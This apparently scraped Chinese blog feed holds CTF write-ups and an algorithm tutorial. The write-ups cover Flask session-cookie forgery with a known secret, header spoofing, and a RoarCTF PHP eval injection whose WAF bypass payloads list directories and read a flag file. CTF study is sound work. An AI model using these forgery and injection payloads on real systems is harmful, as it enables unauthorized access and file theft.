class="line">.eJw9kMtuwjAQRX-lmjUL6sQbJBapnEZZjCOQA5rZoDaE5mFTKQkKMeLf63bR_dxzz50HnC5DPTawmYZbvYJTe4bNA14-YQNstCOBd3Y7Waiz00du6JhLVm-WzcFxlsbalHFhdMtm3xfKtuQbqzOKwn2Pplq0f2_Q4UI-jwv1FbK_DIw4K9dakKQuleh7SY7mQuWyyHazVmerVXUnE3q6PmaVLJilHkUZYWcbVijYpF6L_M7ZodMCt_BcQTUOl9P03dfX_wlBL6jsWzzmEflyQZNEqJKZOwoKbMmUArtDULW9NolgVUmct3-464erA2KqxwlWcBvr4e858LqG5w-vGWQP.YD4iqQ.MevnBxrmcKjysXg7dvwI5MbJTTY</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">moth@DESKTOP-S6G2ROG MINGW64 /f/ctf/有用的脚本/Flask Session Cookie Decoder or Encoder/flask-session-cookie-manager-master</span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 flask_session_cookie_manager3.py  decode  -c <span class="string">&#x27;.eJw9kMtuwjAQRX-lmjUL6sQbJBapnEZZjCOQA5rZoDaE5mFTKQkKMeLf63bR_dxzz50HnC5DPTawmYZbvYJTe4bNA14-YQNstCOBd3Y7Waiz00du6JhLVm-WzcFxlsbalHFhdMtm3xfKtuQbqzOKwn2Pplq0f2_Q4UI-jwv1FbK_DIw4K9dakKQuleh7SY7mQuWyyHazVmerVXUnE3q6PmaVLJilHkUZYWcbVijYpF6L_M7ZodMCt_BcQTUOl9P03dfX_wlBL6jsWzzmEflyQZNEqJKZOwoKbMmUArtDULW9NolgVUmct3-464erA2KqxwlWcBvr4e858LqG5w-vGWQP.YD4g1A.pYCCUo84nblfygDJ7Km0KFgYeb8&#x27;</span> -s <span class="string">&#x27;ckj123&#x27;</span></span></span><br><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;e3fcc1fd987f5faab9d0ee5fda855893be4d89bc8e4f787d17271a2c2c28889d6aac7de47f9b19399bf08298d047e471a0ef98d020a33e729ad36e137b1dec7c&#x27;, &#x27;csrf_token&#x27;: b&#x27;55784b1b7c52107000f67dfea5625d19d506d793&#x27;, &#x27;name&#x27;: &#x27;test&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line"></span><br><span class="line">moth@DESKTOP-S6G2ROG MINGW64 /f/ctf/有用的脚本/Flask Session Cookie Decoder or Encoder/flask-session-cookie-manager-master</span><br><span class="line"><span class="meta">$</span><span class="bash"> python3 flask_session_cookie_manager3.py  encode -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;e3fcc1fd987f5faab9d0ee5fda855893be4d89bc8e4f787d17271a2c2c28889d6aac7de47f9b19399bf08298d047e471a0ef98d020a33e729ad36e137b1dec7c&#x27;, &#x27;csrf_token&#x27;: b&#x27;55784b1b7c52107000f67dfea5625d19d506d793&#x27;, &#x27;name&#x27;: &#x27;test&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span> -s <span class="string">&#x27;ckj123&#x27;</span></span></span><br><span class="line">.eJw9kMtuwjAQRX-lmjUL6sQbJBapnEZZjCOQA5rZoDaE5mFTKQkKMeLf63bR_dxzz50HnC5DPTawmYZbvYJTe4bNA14-YQNstCOBd3Y7Waiz00du6JhLVm-WzcFxlsbalHFhdMtm3xfKtuQbqzOKwn2Pplq0f2_Q4UI-jwv1FbK_DIw4K9dakKQuleh7SY7mQuWyyHazVmerVXUnE3q6PmaVLJilHkUZYWcbVijYpF6L_M7ZodMCt_BcQTUOl9P03dfX_wlBL6jsWzzmEflyQZNEqJKZOwoKbMmUArtDULW9NolgVUmct3-464erA2KqxwlWcBvr4e858LqG5w-vGWQP.YD4iqQ.MevnBxrmcKjysXg7dvwI5MbJTTY</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unicode欺骗 </tag>
            
            <tag> session伪造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2021做题笔记</title>
      <link href="2021/02/21/hgame2021%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
      <url>2021/02/21/hgame2021%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>hgame2021,跟着做做，巩固所学，顺便看看有什么新东西</p><span id="more"></span><h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><hr><h3 id="web–Hitchhiking-in-the-Galaxy"><a href="#web–Hitchhiking-in-the-Galaxy" class="headerlink" title="web–Hitchhiking_in_the_Galaxy"></a>web–Hitchhiking_in_the_Galaxy</h3><hr><p>考点是http协议的一些基本点如User-Agent、Referer、X-Forwarded-For等</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/HitchhikerGuide.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>hitchhiker42.0727.site:42420</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Infinite Improbability Drive/83.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://cardinal.ink/</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure><p>web–</p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法入门--跳到平方根之查找</title>
      <link href="2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/"/>
      <url>2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/</url>
      
        <content type="html"><![CDATA[<p>浮点数和算数、面向连续域的折半查找和面向离散域的二分搜索</p><span id="more"></span><h3 id="0x01-迭代查找"><a href="#0x01-迭代查找" class="headerlink" title="0x01 迭代查找"></a>0x01 迭代查找</h3><p>已知数字n是完全平方数，尝试从1开始求平方，如果平方小于n，则递增到2，以此类推，直至找到平方根a使其满足 a的平方等于后退出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSquareRoot</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x&lt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;sorry,no imaginary numbers!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    ans=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> ans**<span class="number">2</span>&lt;x:</span><br><span class="line">        ans=ans+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ans**<span class="number">2</span> !=x:</span><br><span class="line">        <span class="built_in">print</span>(x,<span class="string">&#x27;is not a perfect square&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;square root of &#x27;</span>+ <span class="built_in">str</span>(x)+<span class="string">&#x27; is  close to&#x27;</span>+<span class="built_in">str</span>(ans-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Square root of &#x27;</span>+ <span class="built_in">str</span>(x)+<span class="string">&#x27; is &#x27;</span>+<span class="built_in">str</span>(ans))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    findSquareRoot(<span class="number">65536</span>)</span><br><span class="line"> findSquareRoot(<span class="number">65535</span>)</span><br></pre></td></tr></table></figure><p>然而我们发现</p><p><img src="/2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/image-20210218121111337.png" class="lazyload" data-srcset="/2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/image-20210218121111337.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210218121111337"></p><p>显然这并不正确，65535的平方根应该更接近256才对，于是我们优化一下，引入了小数，并且引入了更小的增量相比于1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSquareRootWithinError</span>(<span class="params">x,epsilion,increment</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Sorry,no imaginary numbers!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    numGuesses = <span class="number">0</span></span><br><span class="line">    ans = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">while</span> x - ans**<span class="number">2</span> &gt; epsilion:</span><br><span class="line">        ans += increment</span><br><span class="line">        numGuesses+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;numGuesses = &#x27;</span>,numGuesses)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">abs</span>(x-ans **<span class="number">2</span> )&gt;epsilion:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Falied on Square root of&quot;</span>,x)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(ans,<span class="string">&#x27;is close to square root of&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    findSquareRootWithinError(<span class="number">65535</span>,<span class="number">.01</span>,<span class="number">.001</span>)</span><br><span class="line">    findSquareRootWithinError(<span class="number">65535</span>,<span class="number">.01</span>,<span class="number">.0001</span>)</span><br><span class="line">    findSquareRootWithinError(<span class="number">65535</span>,<span class="number">.01</span>,<span class="number">.00001</span>)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\vscode\python&gt; e: &amp;&amp; cd e:\vscode\python &amp;&amp; cmd /C &quot;D:\python38\python3.exe c:\Users\moth\.vscode\extensions\ms-python.python-2021.2.576481509\pythonFiles\lib\python\debugpy\launcher 59895 -- e:\vscode\python\跳到平方根\1.py &quot;</span><br><span class="line">numGuesses =  255999</span><br><span class="line">Falied on Square root of 65535</span><br><span class="line">numGuesses =  2559981</span><br><span class="line">Falied on Square root of 65535</span><br><span class="line">numGuesses =  25599803</span><br><span class="line">255.99803007005775 is close to square root of 65535</span><br></pre></td></tr></table></figure><p>然而这个算法中，我们发现对于increment偏大的情况很容易不成功，具体原因是因为</p><p><img src="/2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/image-20210218122711318.png" class="lazyload" data-srcset="/2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/image-20210218122711318.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210218122711318"></p><p>因为<code>a**2 - (a-1)**2</code>是逐渐增大的，从而会造成出现上述情况，我们只能通过调小increment的值从而得到结果</p><p>但是调小increment意味着计算次数特别大，比如上面测试的数据 进行了25599803次计算，才得到结果</p><h3 id="0x02-折半查找"><a href="#0x02-折半查找" class="headerlink" title="0x02 折半查找"></a>0x02 折半查找</h3><p>为了优化上述算法，我们可以找到一个ans值，测试如果 ans**2&gt;x，那么就不需要检查大于ans的猜测，同样测试如果</p><p>ans**2&lt;x，那么就不需要检查小于ans的猜测。所以在上述情况中，我们可以缩小范围为[0,ans]和[ans,x]。当我们已得到</p><p>范围[0,ans]和[ans,x],从两个极值中取中间值是比较合理的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bisectionSearchForSquareRoot</span>(<span class="params">x, epslion</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Sorry,imaginary numbers are out of &#x27;</span>, x)</span><br><span class="line">    numGuesses = <span class="number">0</span></span><br><span class="line">    low = <span class="number">0.0</span></span><br><span class="line">    high = x</span><br><span class="line">    ans = (low + high) / <span class="number">2.0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">abs</span>(ans**<span class="number">2</span> - x) &gt;= epslion:</span><br><span class="line">        <span class="keyword">if</span> ans**<span class="number">2</span> &lt; x:</span><br><span class="line">            low = ans</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = ans</span><br><span class="line">        ans = (high + low) / <span class="number">2.0</span></span><br><span class="line">        numGuesses += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;numGuesses =&#x27;</span>, numGuesses)</span><br><span class="line">    <span class="built_in">print</span>(ans, <span class="string">&#x27;is close to square root of&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    bisectionSearchForSquareRoot(<span class="number">65535</span>,<span class="number">.01</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/image-20210218142748221.png" class="lazyload" data-srcset="/2021/02/18/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%B7%B3%E5%88%B0%E5%B9%B3%E6%96%B9%E6%A0%B9%E4%B9%8B%E6%9F%A5%E6%89%BE/image-20210218142748221.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210218142748221"></p><p>极大地提高了程序的效率</p><h3 id="0x03-二分搜索"><a href="#0x03-二分搜索" class="headerlink" title="0x03 二分搜索"></a>0x03 二分搜索</h3><p>对连续变量做折半查找的思路，与离散变量的二分搜索密切相关，接下来我们看一下二分搜索</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsearch</span>(<span class="params">value,L</span>):</span></span><br><span class="line">    NOTFOUND=-<span class="number">1</span></span><br><span class="line">    lo,hi=<span class="number">0</span>,<span class="built_in">len</span>(L)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> lo&lt;= hi:</span><br><span class="line">        mid=(lo +hi)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> L[mid]&lt;value:</span><br><span class="line">            lo =mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> value &lt;L[mid]:</span><br><span class="line">            hi = mid -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">    <span class="keyword">return</span> NOTFOUND</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Ls=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">35</span>,<span class="number">76</span>,<span class="number">88</span>,<span class="number">93</span>]</span><br><span class="line">    <span class="built_in">print</span>(bsearch(<span class="number">8</span>,Ls))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 用python解决算法谜题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[RoarCTF 2019]Easy Calc</title>
      <link href="2021/02/10/RoarCTF-2019-Easy-Calc/"/>
      <url>2021/02/10/RoarCTF-2019-Easy-Calc/</url>
      
        <content type="html"><![CDATA[<p>这个题的考察的知识点是php字符串解析特性，或者http走私漏洞</p><span id="more"></span><h3 id="php字符串解析漏洞"><a href="#php字符串解析漏洞" class="headerlink" title="php字符串解析漏洞"></a>php字符串解析漏洞</h3><p>:label: php需要将所有参数转换为有效的变量名，在解析查询字符串时，会做两件事</p><blockquote><ol><li>删除空白符</li><li>将某些字符转换为下划线 (空格、[、]等)</li></ol></blockquote><h3 id="HTTP走私攻击"><a href="#HTTP走私攻击" class="headerlink" title="HTTP走私攻击"></a>HTTP走私攻击</h3><blockquote><p>http走私漏洞成因本质是前端服务器(CDN)和后端服务器接收数据的处理方式不同步</p></blockquote><p>类型如下：</p><ul><li>CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。</li><li>TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。</li><li> TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</li></ul><p>详细参考：<a href="https://xz.aliyun.com/t/6654#toc-7">https://xz.aliyun.com/t/6654#toc-7</a></p><h3 id="0x01-分析题目"><a href="#0x01-分析题目" class="headerlink" title="0x01 分析题目"></a>0x01 分析题目</h3><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220125905.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220125905.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210220125905"></p><p>每次计算进行了一次对结果的get请求</p><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220323006.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220323006.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210220323006"></p><p>burp抓包改包测试 得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>显然存在php代码执行漏洞 然而测试phpinfo()并不成功,应该存在waf</p><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220715107.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220715107.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210220715107"></p><h3 id="0x02-利用php字符串解析漏洞bypass-waf"><a href="#0x02-利用php字符串解析漏洞bypass-waf" class="headerlink" title="0x02 利用php字符串解析漏洞bypass waf"></a>0x02 利用php字符串解析漏洞bypass waf</h3><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220922578.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210220922578.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210220922578"></p><p>查看php中禁掉的函数</p><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210221021847.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210221021847.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210221021847"></p><p>好家伙，我特么直接好家伙.jpg</p><p>还好 还有 file_get_content()、scandir() 并未过滤</p><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210221527194.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210221527194.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210210221527194"></p><p>还有个黑名单，最终</p><blockquote><p>?%20num=1;var_dump(scandir(chr(47)))</p><p>?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</p></blockquote><p>此外还可用</p><blockquote><p><strong>dechex() 函数</strong>：把十进制转换为十六进制。<br> <strong>hex2bin() 函数</strong>：把十六进制值的字符串转换为 ASCII 字符。<br> <strong>readfile() 函数</strong>：输出一个文件写入缓冲区。</p><p><strong>base_convert() 函数</strong>：在任意进制间转换数字</p></blockquote><h3 id="0x03利用http走私攻击完成绕过"><a href="#0x03利用http走私攻击完成绕过" class="headerlink" title="0x03利用http走私攻击完成绕过"></a>0x03利用http走私攻击完成绕过</h3><p>我们采用 cl-cl型绕过</p><p><img src="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210224816896.png" class="lazyload" data-srcset="/2021/02/10/RoarCTF-2019-Easy-Calc/image-20210210224816896.png" 